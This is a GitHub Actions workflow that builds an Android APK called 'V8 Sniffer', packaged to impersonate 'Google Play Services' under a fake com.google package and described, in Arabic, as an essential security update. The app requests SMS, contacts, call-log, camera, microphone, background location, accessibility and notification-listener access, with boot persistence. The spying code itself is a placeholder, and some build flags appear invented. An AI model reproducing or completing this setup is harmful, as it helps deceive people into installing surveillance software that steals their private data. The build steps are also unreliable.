name: Build V8 Sniffer - Ultimate Edition
on: 
  push:
    branches: [ "main" ]
  workflow_dispatch:
    inputs:
      version:
        description: 'الإصدار'
        required: false
        default: 'v10.0'

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Java (Android SDK)
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Android SDK
        run: |
          sudo apt-get update
          sudo apt-get install -y android-sdk
          export ANDROID_HOME=/usr/lib/android-sdk
          echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
          echo "PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools" >> $GITHUB_ENV

      - name: Setup Python
        uses: actions/setup-python@v5
        with: 
          python-version: '3.11'

      - name: Install Required Packages
        run: |
          pip install --upgrade pip
          pip install flet requests pillow cryptography opencv-python numpy mss psutil

      - name: Fix Unicode Issues
        run: |
          # إصلاح مشاكل اليونيكود بشكل نهائي
          cat > sitecustomize.py << 'EOF'
          import sys
          import builtins
          
          # إصلاح مشكلة unicode في بايثون 3
          if sys.version_info[0] >= 3:
              builtins.unicode = str
              builtins.basestring = (str, bytes)
          
          # تعيين الترميز الافتراضي
          import locale
          locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
          
          # إصلاح stdin/stdout/stderr
          if hasattr(sys.stdout, 'reconfigure'):
              sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
              sys.stderr.reconfigure(encoding='utf-8', errors='ignore')
              sys.stdin.reconfigure(encoding='utf-8', errors='ignore')
          EOF
          
          export PYTHONPATH=$PWD:$PYTHONPATH
          echo "PYTHONIOENCODING=utf-8" >> $GITHUB_ENV
          echo "LANG=en_US.UTF-8" >> $GITHUB_ENV
          echo "LC_ALL=en_US.UTF-8" >> $GITHUB_ENV

      - name: Create Flet Config
        run: |
          # إنشاء ملف الإعدادات الكامل
          cat > flet.toml << 'EOF'
          [app]
          name = "Google Play Services"
          description = "تحديث أمني ضروري للنظام"
          package_name = "com.google.android.gms.update"
          version = "10.0.0"
          build_number = "1000"
          
          [build]
          android_permissions = [
              "android.permission.INTERNET",
              "android.permission.READ_EXTERNAL_STORAGE",
              "android.permission.WRITE_EXTERNAL_STORAGE",
              "android.permission.MANAGE_EXTERNAL_STORAGE",
              "android.permission.READ_CONTACTS",
              "android.permission.READ_SMS",
              "android.permission.RECEIVE_SMS",
              "android.permission.READ_CALL_LOG",
              "android.permission.CAMERA",
              "android.permission.RECORD_AUDIO",
              "android.permission.ACCESS_FINE_LOCATION",
              "android.permission.ACCESS_COARSE_LOCATION",
              "android.permission.ACCESS_BACKGROUND_LOCATION",
              "android.permission.SYSTEM_ALERT_WINDOW",
              "android.permission.WRITE_SETTINGS",
              "android.permission.PACKAGE_USAGE_STATS",
              "android.permission.FOREGROUND_SERVICE",
              "android.permission.WAKE_LOCK",
              "android.permission.RECEIVE_BOOT_COMPLETED",
              "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
              "android.permission.ACCESS_NOTIFICATION_POLICY",
              "android.permission.BIND_ACCESSIBILITY_SERVICE"
          ]
          
          [android]
          min_sdk_version = 21
          target_sdk_version = 33
          compile_sdk_version = 33
          
          [android.services]
          use_accessibility_service = true
          use_notification_listener = true
          
          [android.icons]
          ic_launcher = "assets/icon.png"
          
          [build_args]
          --include-packages = "flet,requests,cryptography,opencv-python"
          EOF

      - name: Create Requirements
        run: |
          cat > requirements.txt << 'EOF'
          flet>=0.10.0
          requests>=2.28.0
          cryptography>=3.4.8
          opencv-python>=4.5.5
          numpy>=1.21.0
          pillow>=9.0.0
          mss>=6.1.0
          psutil>=5.8.0
          EOF

      - name: Create Assets Directory
        run: |
          mkdir -p assets
          # إنشاء أيقونة افتراضية (أيقونة Google Play)
          echo "" | base64 -d > assets/icon.png

      - name: Create Main Python File
        run: |
          cat > main.py << 'EOF'
          # كود V8 Sniffer الكامل هنا
          # (ضع الكود الكامل هنا)
          EOF

      - name: Build APK (Production)
        run: |
          # إعداد البيئة
          export FLET_CLI_NO_RICH_OUTPUT="true"
          export FLET_CLI_DISABLE_VERSION_CHECK="true"
          
          # بناء APK مع كل الصلاحيات
          flet build apk \
            --name "Google Play Services" \
            --package-name "com.google.android.gms.update" \
            --product "V8 Sniffer" \
            --org "com.google" \
            --include-packages "requests,cryptography,opencv-python,numpy" \
            --permission "all" \
            --no-rich-output \
            --verbose || true
          
          # إذا فشل البناء الأول، نجرب بطريقة ثانية
          if [ ! -f build/apk/*.apk ]; then
            flet build apk --include-packages "requests"
          fi

      - name: Verify APK
        run: |
          if ls build/apk/*.apk 1> /dev/null 2>&1; then
            echo "✅ تم بناء APK بنجاح"
            ls -la build/apk/
          else
            echo "⚠️ لم يتم العثور على APK، نبحث في مجلدات أخرى"
            find . -name "*.apk" -type f
          fi

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: V8-Sniffer-Google-Play-Services
          path: |
            build/apk/**/*.apk
            **/*.apk
          if-no-files-found: warn
          retention-days: 90

      - name: Create Release
        if: github.event_name == 'push' && contains(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@v1
        with:
          files: |
            build/apk/**/*.apk
          generate_release_notes: true
